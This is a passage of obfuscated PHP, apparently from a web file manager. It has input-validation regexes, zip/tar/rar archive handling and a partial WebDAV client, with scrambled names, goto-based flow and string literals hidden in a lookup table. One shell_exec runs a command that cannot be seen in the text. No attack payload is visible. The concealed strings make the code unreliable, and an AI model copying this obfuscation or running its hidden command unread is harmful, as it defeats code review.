$d‚’§–Öç·; if (isset($FÛÑÒËæï[$eÅ³¯Ç–»[1853]]) && $FÛÑÒËæï[$eÅ³¯Ç–»[1853]]) { $EßºÀƒïä× = $FÛÑÒËæï[$eÅ³¯Ç–»[1853]]; } goto F¸ÉÔğ»Î¾; BÙ°ø’ÖêÇ: } goto D«Ûˆ¨ù‚ó; dî…‘¹ÚÎ: $eÅ³¯Ç–» =& $_SERVER[Ö¹ñÒÁ²÷]; global $in; $D÷¹Öøç»” = array(); goto B„­µë°à; c†·™Œáß¢: } public static function reg($Dµ¯´çÕÚ = "\162\145\x71\x75\151\x72\145") { static $C¼ó°É² = array("\x72\x65\x71\165\x69\x72\x65" => "\56\x2b", "\x6e\165\x6d\142\145\x72" => "\134\x64\53", "\150\145\170" => "\133\60\x2d\71\x41\x2d\106\141\x2d\x66\x5d\x2b", "\x69\156\164" => "\x5b\x2d\134\53\x5d\77\134\144\53", "\x62\x6f\157\154" => "\60\174\x31", "\x66\x6c\157\141\164" => "\133\x2d\134\x2b\x5d\77\x5c\144\53\x28\x5c\x2e\x5c\x64\53\x29\77", "\x65\x6e\147\x6c\151\163\150" => "\x5b\x41\55\x5a\141\x2d\172\40\x5d\x2b", "\143\150\x69\156\x65\x73\x65" => "\x5b\134\170\x7b\x34\x65\60\60\175\x2d\x5c\x78\x7b\x39\x66\141\65\175\135\x2b", "\150\x61\163\x43\150\x69\156\x65\x73\145" => "\x2f\x28\133\x5c\170\173\64\145\x30\60\x7d\x2d\x5c\x78\x7b\71\146\141\x35\175\x5d\x2b\51\x2f\x75", "\145\x6d\x61\x69\x6c" => "\134\167\53\x28\x5b\134\56\134\55\135\134\x77\x2b\51\x2a\134\x40\134\x77\53\x28\x5b\x5c\56\x5c\x2d\135\x5c\167\x2b\51\52\x5c\x2e\134\167\x2b", "\160\x68\157\x6e\145" => "\61\x5b\x33\55\x39\x5d\134\x64\x7b\71\x7d", "\x74\x65\x6c\160\x68\x6f\x6e\x65" => "\50\134\50\134\x64\173\x33\54\64\x7d\x5c\51\174\134\144\173\63\54\64\x7d\55\x7c\x5c\x73\x29\x3f\x5c\x64\173\x37\x2c\x31\64\x7d", "\x75\162\x6c" => "\50\x68\164\x74\x70\174\146\164\160\x7c\x68\164\164\x70\x73\51\x3a\134\x2f\x5c\57\x5b\x5c\x77\x5c\55\x5f\135\x2b\50\x5c\x2e\133\134\167\134\55\x5f\135\53\51\x2b\x28\x5b\x5c\x77\134\55\x5c\56\x2c\100\77\136\x3d\x25\46\x3a\134\57\176\134\x2b\43\135\x2a\x5b\134\167\134\x2d\134\100\77\136\75\45\x26\134\57\x7e\x5c\53\x23\135\51\x3f", "\x75\x72\154\106\x75\154\154" => "\133\141\x2d\x7a\101\x2d\172\135\53\72\x5c\57\134\57\x5b\x5e\134\x73\135\x2a", "\151\160" => "\x28\x5c\x64\173\x31\x2c\63\x7d\x5c\x2e\51\173\x33\175\x28\x5c\x64\173\x31\x2c\x33\175\51", "\x7a\151\160" => "\133\61\55\x39\x5d\134\x64\x7b\x35\175\x28\x3f\x21\134\144\x29", "\151\144\103\x61\162\144" => "\50\x5c\x64\173\61\x35\x7d\x29\174\x28\134\144\x7b\x31\67\x7d\50\x5c\144\174\x58\174\x78\51\51", "\x63\x6f\154\157\162" => "\43\50\x5b\60\x2d\71\101\x2d\x46\x61\55\x66\x5d\x7b\63\x7d\x7c\133\x30\x2d\71\x41\x2d\106\x61\55\x66\135\173\66\175\x29", "\164\x69\x6d\x65" => "\50\x5b\60\55\61\x5d\134\x64\174\62\133\60\55\x34\x5d\x29\x3a\133\x30\x2d\65\135\134\x64", "\x64\141\x74\145" => "\134\144\x7b\64\x7d\x5b\55\x5c\x2f\135\77\x28\60\133\61\x2d\71\135\174\61\x5b\x30\55\62\x5d\x29\133\55\x5c\57\135\77\x28\x5b\60\x2d\x32\x5d\x5c\144\x7c\x33\x5b\60\55\61\135\51", "\x64\x61\164\145\x54\x69\155\x65" => "\x5c\144\x7b\64\x7d\133\x2d\x5c\x2f\x5d\x3f\x28\x30\133\x31\55\x39\135\x7c\61\133\60\x2d\62\x5d\51\x5b\x2d\x5c\57\x5d\77\50\x5b\60\x2d\62\135\134\x64\174\x33\x5b\x30\x2d\x31\135\x29\x5c\x73\x2b\50\x5b\60\x2d\x31\x5d\x5c\144\174\x32\133\x30\55\64\135\x29\72\133\60\55\x35\x5d\134\144", "\x70\x61\163\x73\167\x6f\x72\144" => "\x28\77\x3d\x2e\x2a\x5c\x64\51\x28\x3f\75\x2e\52\133\x61\55\172\x5d\x29\50\77\75\56\52\133\101\55\x5a\x5d\x29\x2e\x7b\70\x2c\62\x30\x7d", "\x6b\145\171" => "\133\101\55\x5a\x61\55\172\x30\x2d\71\137\134\55\134\x2e\x5d\x2b", "\153\145\x79\106\165\x6c\154" => "\x5b\x41\55\x5a\141\55\x7a\60\55\x39\x5f\134\x2d\x5c\56\134\163\54\135\x2b"); if (!$Dµ¯´çÕÚ) { return $C¼ó°É²; } return $C¼ó°É²[$Dµ¯´çÕÚ]; } public static function check($AËÌˆñ, $FôìáÎöñÑ, $DŠö¡œªëä = null) { $aš âà¦× =& $_SERVER[Ö¹ñÒÁ²÷]; switch ($FôìáÎöñÑ) { case $aš âà¦×[7]: return in_array($AËÌˆñ, $DŠö¡œªëä); break; case $aš âà¦×[1857]: return floatval($AËÌˆñ) > $DŠö¡œªëä; break; case $aš âà¦×[1858]: return floatval($AËÌˆñ) < $DŠö¡œªëä; break; case $aš âà¦×[321]: return strlen($AËÌˆñ) >= $DŠö¡œªëä[0] && strlen($AËÌˆñ) <= $DŠö¡œªëä[1]; break; case $aš âà¦×[321]: if (is_array($DŠö¡œªëä)) { return strlen($AËÌˆñ) >= $DŠö¡œªëä[0] && strlen($AËÌˆñ) <= $DŠö¡œªëä[1]; break; } else { return strlen($AËÌˆñ) == $DŠö¡œªëä; break; } case $aš âà¦×[317]: return floatval($AËÌˆñ) >= $DŠö¡œªëä[0] && floatval($AËÌˆñ) <= $DŠö¡œªëä[1]; break; } $a·†ùÉàßò = self::reg(!1); $FôìáÎöñÑ = isset($a·†ùÉàßò[$FôìáÎöñÑ]) ? $a·†ùÉàßò[$FôìáÎöñÑ] : $FôìáÎöñÑ; if (substr($FôìáÎöñÑ, 0, 1) != $aš âà¦×[8]) { $FôìáÎöñÑ = $aš âà¦×[1859] . $FôìáÎöñÑ . $aš âà¦×[1860]; } return preg_match($FôìáÎöñÑ, $AËÌˆñ) === 1; } public static function get($cØŠ¢¸Ö„ø, $bÌìêÛŞ˜± = null, $a ’ÇäÁÈã = null, $dÄæ’øŸ´ = null) { goto B³ÓÜ’†ç ; B³ÓÜ’†ç : $B£ŞÌ‹›¨µ =& $_SERVER[Ö¹ñÒÁ²÷]; $aåïù…Ëİ = array(); if (!is_null($a ’ÇäÁÈã)) { $aåïù…Ëİ[$B£ŞÌ‹›¨µ[34]] = $a ’ÇäÁÈã; } goto bßåÃìŠ; e½Ùä›Î : return $a›¡¨‰ß[$cØŠ¢¸Ö„ø]; goto C¡£ë¹³ï‹; bßåÃìŠ: if (!is_null($dÄæ’øŸ´)) { $aåïù…Ëİ[$B£ŞÌ‹›¨µ[1005]] = $dÄæ’øŸ´; } if (!is_null($bÌìêÛŞ˜±)) { $aåïù…Ëİ[$B£ŞÌ‹›¨µ[1855]] = $bÌìêÛŞ˜±; } $a›¡¨‰ß = Input::getArray(array($cØŠ¢¸Ö„ø => $aåïù…Ëİ)); goto e½Ùä›Î ; C¡£ë¹³ï‹: } } class KodArchive { static function init() { goto dåøÚ¬±‚; dŠŠæ‚‘Ù: define($BÃ‘†ğØ¥¢[1863], TEMP_FILES); define($BÃ‘†ğØ¥¢[1864], TEMP_FILES); define($BÃ‘†ğØ¥¢[1865], $BÃ‘†ğØ¥¢[1866]); goto f×±³ğÑè; f×±³ğÑè: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1867]; require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1868]; goto d¤Å‰¾¾Ü°; d¤Å‰¾¾Ü°: require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1869]; require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1870]; require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1871]; goto ağÑÏ¦·¯÷; dåøÚ¬±‚: $BÃ‘†ğØ¥¢ =& $_SERVER[Ö¹ñÒÁ²÷]; if (defined($BÃ‘†ğØ¥¢[1861])) { return; } define($BÃ‘†ğØ¥¢[1861], SDK_DIR . $BÃ‘†ğØ¥¢[1862]); goto dŠŠæ‚‘Ù; ağÑÏ¦·¯÷: require_once ARCHIVE_LIB . $BÃ‘†ğØ¥¢[1872]; goto cöà¹âÍ²; cöà¹âÍ²: } static function checkIfType($b–‘‚­³š‰, $Bö¾ôÜåËß) { goto E‚ÙÒ Òî; f“ê«œ—÷ˆ: $e®èš¯ÄÈƒ = in_array($b–‘‚­³š‰, $aŞå¥«åô[$Bö¾ôÜåËß]); if ($e®èš¯ÄÈƒ && ($Bö¾ôÜåËß == $AÙË¾ÜÁõ¾[297] || $Bö¾ôÜåËß == $AÙË¾ÜÁõ¾[1876]) && (!function_exists($AÙË¾ÜÁõ¾[1884]) || !function_exists($AÙË¾ÜÁõ¾[1885]))) { show_tips($AÙË¾ÜÁõ¾[1886]); } if ($e®èš¯ÄÈƒ && $Bö¾ôÜåËß == $AÙË¾ÜÁõ¾[1039] && (!function_exists($AÙË¾ÜÁõ¾[1887]) || !strstr(shell_exec($AÙË¾ÜÁõ¾[1888]), $AÙË¾ÜÁõ¾[1889]))) { show_tips($AÙË¾ÜÁõ¾[1890]); } goto Cé¸¶ÄİÇ×; E‚ÙÒ Òî: $AÙË¾ÜÁõ¾ =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $aŞå¥«åô = array($AÙË¾ÜÁõ¾[297] => array($AÙË¾ÜÁõ¾[297], $AÙË¾ÜÁõ¾[1873], $AÙË¾ÜÁõ¾[1874], $AÙË¾ÜÁõ¾[1875]), $AÙË¾ÜÁõ¾[1876] => array($AÙË¾ÜÁõ¾[1876], $AÙË¾ÜÁõ¾[1877], $AÙË¾ÜÁõ¾[1037], $AÙË¾ÜÁõ¾[1035]), $AÙË¾ÜÁõ¾[1039] => array($AÙË¾ÜÁõ¾[1039], $AÙË¾ÜÁõ¾[1878], $AÙË¾ÜÁõ¾[1879], $AÙË¾ÜÁõ¾[1880], $AÙË¾ÜÁõ¾[1881], $AÙË¾ÜÁõ¾[1882], $AÙË¾ÜÁõ¾[1883])); goto f“ê«œ—÷ˆ; Cé¸¶ÄİÇ×: return $e®èš¯ÄÈƒ; goto eó‚²¡¾Š„; eó‚²¡¾Š„: } static function listContent($B‚·ôì™î, $Dã»”Îô = true) { $f¥´ÕÙğË =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $F‹½¤Úœ¶Ú = !empty($GLOBALS[$f¥´ÕÙğË[1043]]) ? $GLOBALS[$f¥´ÕÙğË[1043]] : get_path_ext($B‚·ôì™î); $DÚ»×Œëß¾ = !1; if (self::checkIfType($F‹½¤Úœ¶Ú, $f¥´ÕÙğË[1876])) { $D·…ÅÚªÑ = PclTarList($B‚·ôì™î, $F‹½¤Úœ¶Ú); $DÚ»×Œëß¾ = array(); for ($dÁÕå‚ãÏ = 0; $dÁÕå‚ãÏ < count($D·…ÅÚªÑ); $dÁÕå‚ãÏ++) { $dÏ÷ŞÌ©ŒÏ = $D·…ÅÚªÑ[$dÁÕå‚ãÏ]; if ($dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1891]] == $f¥´ÕÙğË[1892] || $dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1891]] == $f¥´ÕÙğË[1893]) { continue; } if ($Dã»”Îô) { $dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1894]] = ltrim($dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1894]], $f¥´ÕÙğË[1141]); } if ($dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1891]] == $f¥´ÕÙğË[1895]) { $dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[76]] = !0; } else { $dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[76]] = !1; } $dÏ÷ŞÌ©ŒÏ[$f¥´ÕÙğË[1030]] = $dÁÕå‚ãÏ; $DÚ»×Œëß¾[] = $dÏ÷ŞÌ©ŒÏ; } } else { if (self::checkIfType($F‹½¤Úœ¶Ú, $f¥´ÕÙğË[1039])) { $fçç¢—Ä = kodRarArchive::listContent($B‚·ôì™î); if (!$fçç¢—Ä[$f¥´ÕÙğË[1026]]) { return $fçç¢—Ä; } else { $DÚ»×Œëß¾ = $fçç¢—Ä[$f¥´ÕÙğË[1028]]; } } else { if (kodZipArchive::support($f¥´ÕÙğË[350])) { $DÚ»×Œëß¾ = kodZipArchive::listContent($B‚·ôì™î); } else { $fïæÁææÒÆ = new PclZip($B‚·ôì™î); $DÚ»×Œëß¾ = $fïæÁææÒÆ->listContent(); } } } if ($DÚ»×Œëß¾) { $AŠ¿‡îÈô¢ = unzip_charset_get($DÚ»×Œëß¾); $Dã»”Îô = $Dã»”Îô && function_exists($f¥´ÕÙğË[65]); for ($dÁÕå‚ãÏ = 0; $dÁÕå‚ãÏ < count($DÚ»×Œëß¾); $dÁÕå‚ãÏ++) { $DÚ»×Œëß¾[$dÁÕå‚ãÏ][$f¥´ÕÙğË[1894]] = str_replace(array($f¥´ÕÙğË[1066], $f¥´ÕÙğË[1896]), $f¥´ÕÙğË[759], $DÚ»×Œëß¾[$dÁÕå‚ãÏ][$f¥´ÕÙğË[1894]]); if ($Dã»”Îô) { $DÚ»×Œëß¾[$dÁÕå‚ãÏ][$f¥´ÕÙğË[1894]] = iconv_to($DÚ»×Œëß¾[$dÁÕå‚ãÏ][$f¥´ÕÙğË[1894]], $AŠ¿‡îÈô¢, $f¥´ÕÙğË[322]); unset($DÚ»×Œëß¾[$dÁÕå‚ãÏ][$f¥´ÕÙğË[1897]]); } } return array($f¥´ÕÙğË[1026] => !0, $f¥´ÕÙğË[1028] => $DÚ»×Œëß¾); } else { return array($f¥´ÕÙğË[1026] => !1, $f¥´ÕÙğË[1028] => $DÚ»×Œëß¾); } } static function extract($Aµ¦÷ìÆÂ–, $d¬¶î„Í§Â, $EøÒ‘„ÂŠø = "\55\x31", &$CëˆĞºÜ¹è = false) { goto aŸãæ„¯ßÇ; d‘©‹·†‡é: if (self::checkIfType($eÁ ô¯¾ø„, $FŠø¿Ê‚[1876])) { if ($EøÒ‘„ÂŠø != $FŠø¿Ê‚[1025]) { $AÍÑº¡†¸ = unzip_pre_name($AÍÑº¡†¸); $dÃî¢­˜ê‰ = unzip_pre_name($dÃî¢­˜ê‰); $FİªèÀ¾åÈ = PclTarExtractList($Aµ¦÷ìÆÂ–, array($AÍÑº¡†¸), $d¬¶î„Í§Â, $dÃî¢­˜ê‰, $eÁ ô¯¾ø„); } else { $FİªèÀ¾åÈ = PclTarExtract($Aµ¦÷ìÆÂ–, $d¬¶î„Í§Â, $FŠø¿Ê‚[357], $eÁ ô¯¾ø„); } return array($FŠø¿Ê‚[1026] => $FİªèÀ¾åÈ, $FŠø¿Ê‚[1028] => PclErrorString(!0)); } else { if (self::checkIfType($eÁ ô¯¾ø„, $FŠø¿Ê‚[1039])) { return kodRarArchive::extract($Aµ¦÷ìÆÂ–, $d¬¶î„Í§Â, $eÁ ô¯¾ø„, $CëˆĞºÜ¹è); } else { if (kodZipArchive::support($FŠø¿Ê‚[1898])) { return kodZipArchive::extract($Aµ¦÷ìÆÂ–, $d¬¶î„Í§Â, $CëˆĞºÜ¹è); } else { $fÖ«ÛŒ†Áó = new PclZip($Aµ¦÷ìÆÂ–); if ($EøÒ‘„ÂŠø != $FŠø¿Ê‚[1025]) { $FİªèÀ¾åÈ = $fÖ«ÛŒ†Áó->extract(PCLZIP_OPT_PATH, $d¬¶î„Í§Â, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $FŠø¿Ê‚[1899], PCLZIP_OPT_BY_NAME, $cÚ†»ŒÙÕ¾[$FŠø¿Ê‚[1894]], PCLZIP_OPT_REMOVE_PATH, $dÃî¢­˜ê‰, PCLZIP_OPT_REPLACE_NEWER); } else { $FİªèÀ¾åÈ = $fÖ«ÛŒ†Áó->extract(PCLZIP_OPT_PATH, $d¬¶î„Í§Â, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $FŠø¿Ê‚[1899], PCLZIP_OPT_REPLACE_NEWER); } return array($FŠø¿Ê‚[1026] => $FİªèÀ¾åÈ, $FŠø¿Ê‚[1028] => $fÖ«ÛŒ†Áó->errorName(!0)); } } } return array($FŠø¿Ê‚[1026] => !1, $FŠø¿Ê‚[1028] => $FŠø¿Ê‚[1900]); goto Aæ‹ó§ù; aŸãæ„¯ßÇ: $FŠø¿Ê‚ =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $eÁ ô¯¾ø„ = !empty($GLOBALS[$FŠø¿Ê‚[1043]]) ? $GLOBALS[$FŠø¿Ê‚[1043]] : get_path_ext($Aµ¦÷ìÆÂ–); goto eĞ÷†°ã®; eĞ÷†°ã®: $D±­‰ğÃÅÎ = self::listContent($Aµ¦÷ìÆÂ–, !1); if (!$D±­‰ğÃÅÎ[$FŠø¿Ê‚[1026]]) { return $D±­‰ğÃÅÎ; } if ($EøÒ‘„ÂŠø != $FŠø¿Ê‚[1025]) { goto fê³¿è…ñŸ; fê³¿è…ñŸ: $cÚ†»ŒÙÕ¾ = self::fileIndex($D±­‰ğÃÅÎ[$FŠø¿Ê‚[1028]], $EøÒ‘„ÂŠø); $CëˆĞºÜ¹è = str_replace(array($FŠø¿Ê‚[1066], $FŠø¿Ê‚[1896]), $FŠø¿Ê‚[70], $cÚ†»ŒÙÕ¾[$FŠø¿Ê‚[1894]]); $AÍÑº¡†¸ = $CëˆĞºÜ¹è; goto bÊŠÆòË¸î; bÊŠÆòË¸î: if ($GLOBALS[$FŠø¿Ê‚[6]][$FŠø¿Ê‚[1139]] != $FŠø¿Ê‚[322]) { $AÍÑº¡†¸ = unzip_pre_name($CëˆĞºÜ¹è); } $dÃî¢­˜ê‰ = get_path_father($CëˆĞºÜ¹è); if ($dÃî¢­˜ê‰ == $CëˆĞºÜ¹è) { $dÃî¢­˜ê‰ = $FŠø¿Ê‚[33]; } goto B¶ĞŸ÷Éš; B¶ĞŸ÷Éš: if ($cÚ†»ŒÙÕ¾[$FŠø¿Ê‚[76]]) { $AÍÑº¡†¸ = rtrim($AÍÑº¡†¸, $FŠø¿Ê‚[8]) . $FŠø¿Ê‚[8]; $CëˆĞºÜ¹è = array($CëˆĞºÜ¹è); } $b™ …ÔÜß¯ = str_replace($FŠø¿Ê‚[93], $FŠø¿Ê‚[8], $AÍÑº¡†¸); if (substr($b™ …ÔÜß¯, -1) == $FŠø¿Ê‚[8]) { if (!strstr(trim($b™ …ÔÜß¯, $FŠø¿Ê‚[8]), $FŠø¿Ê‚[8])) { $d¬¶î„Í§Â = $d¬¶î„Í§Â . get_path_this($b™ …ÔÜß¯) . $FŠø¿Ê‚[8]; } } else { if ($dÃî¢­˜ê‰ == $AÍÑº¡†¸) { $dÃî¢­˜ê‰ = $FŠø¿Ê‚[33]; } } goto EŞ‰Ç”Ôœ´; EŞ‰Ç”Ôœ´: } goto d‘©‹·†‡é; Aæ‹ó§ù: } static function fileIndex($bœ¶‰‰¡Œ¨, $B„¥´„ÎÈ¯, $fÃ¸Œ°ò‚› = false) { goto cĞ·ãÂë…¾; Cï²æ¾ÃÎÛ: $BŒîö®½„ò = $eÒõãÍÃ¢à; if ($fÃ¸Œ°ò‚›) { $BŒîö®½„ò = $eÒõãÍÃ¢à[$fÃ¸Œ°ò‚›]; if ($eÒõãÍÃ¢à[$e£Ë’–¢Àß[76]]) { $BŒîö®½„ò = rtrim($BŒîö®½„ò, $e£Ë’–¢Àß[8]) . $e£Ë’–¢Àß[8]; } } return $BŒîö®½„ò; goto DÛ¬»íãï; D×÷øÁã‰: $bÉŠóµĞ‚ù = count($bœ¶‰‰¡Œ¨); for ($dÉõ¸öƒ• = 0; $dÉõ¸öƒ• < $bÉŠóµĞ‚ù; $dÉõ¸öƒ•++) { if ($B„¥´„ÎÈ¯ == $bœ¶‰‰¡Œ¨[$dÉõ¸öƒ•][$e£Ë’–¢Àß[1030]]) { $eÒõãÍÃ¢à = $bœ¶‰‰¡Œ¨[$dÉõ¸öƒ•]; break; } } if (!$eÒõãÍÃ¢à) { show_tips($e£Ë’–¢Àß[1901]); } goto Cï²æ¾ÃÎÛ; cĞ·ãÂë…¾: $e£Ë’–¢Àß =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); if (!is_array($bœ¶‰‰¡Œ¨)) { return !1; } goto D×÷øÁã‰; DÛ¬»íãï: } static function extractZipFile($E³™Ğ¨§îØ, $B—ëá³ª¾‡, $eƒŞ˜â½Æ = false) { goto AŞ…©¾ñÅ‘; C È™óÏ»: $B²’Âï”ô¢ = get_path_father($B—ëá³ª¾‡); if ($B²’Âï”ô¢ == $B—ëá³ª¾‡) { $B²’Âï”ô¢ = $dÛ¥¢·´Ï[33]; } $AŠ»‡šÖ¯¯ = $C¾Àƒ–õİö->extract(PCLZIP_OPT_PATH, $d…¾‡æÍó¡, PCLZIP_CB_PRE_FILE_NAME, $dÛ¥¢·´Ï[1899], PCLZIP_OPT_REMOVE_PATH, $B²’Âï”ô¢, PCLZIP_OPT_BY_NAME, $B—ëá³ª¾‡); goto BÚåçàÅ¶š; fŠ³åˆš¨: mk_dir($d…¾‡æÍó¡); $a‰ùÑ»‰İ = $d…¾‡æÍó¡ . md5($E³™Ğ¨§îØ . $B—ëá³ª¾‡); if ($eƒŞ˜â½Æ) { $a‰ùÑ»‰İ = $d…¾‡æÍó¡ . $eƒŞ˜â½Æ; } goto dãºæÑ¤ª; dãºæÑ¤ª: if (file_exists($a‰ùÑ»‰İ)) { return $a‰ùÑ»‰İ; } $C¾Àƒ–õİö = new PclZip($E³™Ğ¨§îØ); $e‚ä›¬¾¦‚ = unzip_filter_ext($d…¾‡æÍó¡ . get_path_this($B—ëá³ª¾‡)); goto C È™óÏ»; AŞ…©¾ñÅ‘: $dÛ¥¢·´Ï =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $d…¾‡æÍó¡ = TEMP_FILES . hash_path($E³™Ğ¨§îØ) . $dÛ¥¢·´Ï[8]; goto fŠ³åˆš¨; BÚåçàÅ¶š: if (!file_exists($e‚ä›¬¾¦‚)) { return !1; } @rename($e‚ä›¬¾¦‚, $a‰ùÑ»‰İ); return $a‰ùÑ»‰İ; goto B™¬ÃÂª‡—; B™¬ÃÂª‡—: } static function filePreview($D ‡Â‘¯äæ, $DË‡´ëøæË, $c¤Ï¶íÕØ = false, $Aåæ¢ŒšÂ¬ = false) { goto C§Æ§Õƒ­…; E¹ÏÖƒ¦ô¯: mk_dir($cºØÜÍå¯); $a°Û‰½¢• = $cºØÜÍå¯ . md5($D ‡Â‘¯äæ . $DË‡´ëøæË . $Aåæ¢ŒšÂ¬); $dœ“ÅÈ©ŸŠ = $dÇ¿ÓˆÆ[33]; goto dğø·Ì”±¿; f¶õœ¨­ëì: if (!file_exists($a°Û‰½¢•)) { del_dir($cºØÜÍå¯); show_json($dÇ¿ÓˆÆ[1904]); } IO::fileOut($a°Û‰½¢•, $c¤Ï¶íÕØ, $aäÊŒÌò´); goto AŞîÅ«Æí; bñ¤ÔÔ£´Ü: $dœ“ÅÈ©ŸŠ = unzip_pre_name($dœ“ÅÈ©ŸŠ); $aäÊŒÌò´ = get_path_this($dœ“ÅÈ©ŸŠ); $d«êÙÑ¯¤é = unzip_filter_ext($cºØÜÍå¯ . $aäÊŒÌò´); goto EÙ©İÏèŒÚ; C§Æ§Õƒ­…: $dÇ¿ÓˆÆ =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $cºØÜÍå¯ = TEMP_FILES . hash_path($D ‡Â‘¯äæ) . $dÇ¿ÓˆÆ[8]; goto E¹ÏÖƒ¦ô¯; EÙ©İÏèŒÚ: if (!$b½ÎŒŞˆ§[$dÇ¿ÓˆÆ[1026]]) { show_json($b½ÎŒŞˆ§[$dÇ¿ÓˆÆ[1028]], !1); } if (!file_exists($d«êÙÑ¯¤é)) { show_json($dÇ¿ÓˆÆ[1903], !1); } @rename($d«êÙÑ¯¤é, $a°Û‰½¢•); goto f¶õœ¨­ëì; dğø·Ì”±¿: $b½ÎŒŞˆ§ = self::extract($D ‡Â‘¯äæ, $cºØÜÍå¯, $DË‡´ëøæË, $dœ“ÅÈ©ŸŠ); if (is_array($dœ“ÅÈ©ŸŠ)) { show_json($dÇ¿ÓˆÆ[1902], !1); } if (file_exists($a°Û‰½¢•)) { IO::fileOut($a°Û‰½¢•, $c¤Ï¶íÕØ, get_path_this($dœ“ÅÈ©ŸŠ)); return; } goto bñ¤ÔÔ£´Ü; AŞîÅ«Æí: } static function create($EŠóƒ”–„Å, $CŒ–÷ˆëÌá) { $AÈ×…‹Å‘Ş =& $_SERVER[Ö¹ñÒÁ²÷]; self::init(); $F¢½ƒŸï = get_path_ext($EŠóƒ”–„Å); $E†„Ìã‹ì = !1; if (self::checkIfType($F¢½ƒŸï, $AÈ×…‹Å‘Ş[297])) { if (kodZipArchive::support($AÈ×…‹Å‘Ş[1004])) { return kodZipArchive::create($EŠóƒ”–„Å, $CŒ–÷ˆëÌá); } $E¬½ËëŒ¤Ì = new PclZip($EŠóƒ”–„Å); foreach ($CŒ–÷ˆëÌá as $AÇ†«¶·¥° => $bŞ°Äì“İ×) { $bŞ°Äì“İ× = str_replace($AÈ×…‹Å‘Ş[463], $AÈ×…‹Å‘Ş[8], $bŞ°Äì“İ×); $A¡İóÜçÄ“ = Kodio::clear(get_path_father($bŞ°Äì“İ×)); if ($AÇ†«¶·¥° == 0) { $E†„Ìã‹ì = $E¬½ËëŒ¤Ì->create($bŞ°Äì“İ×, PCLZIP_OPT_REMOVE_PATH, $A¡İóÜçÄ“, PCLZIP_CB_PRE_FILE_NAME, $AÈ×…‹Å‘Ş[1905]); continue; } $E†„Ìã‹ì = $E¬½ËëŒ¤Ì->add($bŞ°Äì“İ×, PCLZIP_OPT_REMOVE_PATH, $A¡İóÜçÄ“, PCLZIP_CB_PRE_FILE_NAME, $AÈ×…‹Å‘Ş[1905]); } } else { if (self::checkIfType($F¢½ƒŸï, $AÈ×…‹Å‘Ş[1876])) { foreach ($CŒ–÷ˆëÌá as $AÇ†«¶·¥° => $bŞ°Äì“İ×) { $bŞ°Äì“İ× = str_replace($AÈ×…‹Å‘Ş[463], $AÈ×…‹Å‘Ş[8], $bŞ°Äì“İ×); $A¡İóÜçÄ“ = Kodio::clear(get_path_father($bŞ°Äì“İ×)); if ($AÇ†«¶·¥° == 0) { $E†„Ìã‹ì = PclTarCreate($EŠóƒ”–„Å, array($bŞ°Äì“İ×), $F¢½ƒŸï, null, $A¡İóÜçÄ“); continue; } $E†„Ìã‹ì = PclTarAddList($EŠóƒ”–„Å, array($bŞ°Äì“İ×), $AÈ×…‹Å‘Ş[33], $A¡İóÜçÄ“, $F¢½ƒŸï); } } } return $E†„Ìã‹ì; } } goto fİÇÛæ½¾; a÷ã†ï¾»œ: class HttpDavClient { public function __construct($cÄØë™£¯, $dœÔÅÛáñ—, $bÇÃ©¡Óİ) { $this->header = array(); $this->userName = $dœÔÅÛáñ—; $this->userPassowrd = $bÇÃ©¡Óİ; } protected function makePath($a‡ïíõÁä„) { return $a‡ïíõÁä„; } protected function setHeader($eø¡¹ÂÕçˆ, $Cî°öŸÊ¨ = false) { if ($Cî°öŸÊ¨ === !1) { $this->header[] = $eø¡¹ÂÕçˆ; } else { $this->header[] = $eø¡¹ÂÕçˆ . $_SERVER[Ö¹ñÒÁ²÷][876] . $Cî°öŸÊ¨; } } public function move($e·ó®»õ , $fïØäÊÇ’è, $EÒëù¹ĞÓ” = '') { $bãâåĞñİß =& $_SERVER[Ö¹ñÒÁ²÷]; $this->setHeader($bãâåĞñİß[1744], $this->makePath($fïØäÊÇ’è)); $this->setHeader($bãâåĞñİß[1745], $bãâåĞñİß[1746]); if ($EÒëù¹ĞÓ”) { $this->setHeader($bãâåĞñİß[1747], $bãâåĞñİß[921] . $EÒëù¹ĞÓ” . $bãâåĞñİß[924]); } return $this->send($bãâåĞñİß[1748], $e·ó®»õ ); } public function copy($bØ¶°«ãôİ, $FÏ‹Ğ¥ƒÆ÷) { $fÌ§—½µ¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->setHeader($fÌ§—½µ¥[1744], $this->makePath($FÏ‹Ğ¥ƒÆ÷)); $this->setHeader($fÌ§—½µ¥[1745], $fÌ§—½µ¥[1746]); return $this->send($fÌ§—½µ¥[1749], $bØ¶°«ãôİ); } public function mkcol($Fò¤ÉÏ×ˆ‘) { $D¸¾™ŞÛø— =& $_SERVER[Ö¹ñÒÁ²÷]; $this->setHeader($D¸¾™ŞÛø—[1745], $D¸¾™ŞÛø—[1746]); return $this->send($D¸¾™ŞÛø—[1750], $Fò¤ÉÏ×ˆ‘); } public function delete($F½ß¶ßÉÑÓ, $F³‰óª¡†ô = '') { $BøôêƒÀÃ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($F³‰óª¡†ô) { $this->setHeader($BøôêƒÀÃ[1747], $BøôêƒÀÃ[921] . $F³‰óª¡†ô . $BøôêƒÀÃ[924]); } return $this->send($BøôêƒÀÃ[1237], 